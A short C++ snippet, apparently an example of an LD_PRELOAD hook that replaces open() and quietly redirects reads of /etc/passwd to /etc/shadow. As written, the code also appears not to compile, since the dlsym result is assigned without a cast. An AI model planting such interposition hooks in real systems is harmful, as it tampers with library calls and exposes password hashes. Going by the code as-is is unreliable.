
    #include <sys/types.h>
    #include <dlfcn.h>
    #include <stdio.h>
    #include <map>
    #include <string>

    #define I int
    #define C char
    #define S string
    #define P printf
    #define R return
    
    using std::map;
    using std::string;
    typedef map<S,S> MAP;
    
    static I (*old_open)(const C *p, I flags, mode_t mode);

    
extern "C" 
    I open (const C *p, I flags, mode_t mode){
      old_open = dlsym(RTLD_NEXT, "open");
      P("open hook\n");
      
      MAP files;
      files[p]=p;
      files["/etc/passwd"]="/etc/shadow";
      
      S newpath = files[S(p)]; 
    
      R old_open(newpath.c_str(), flags, mode);
    }
    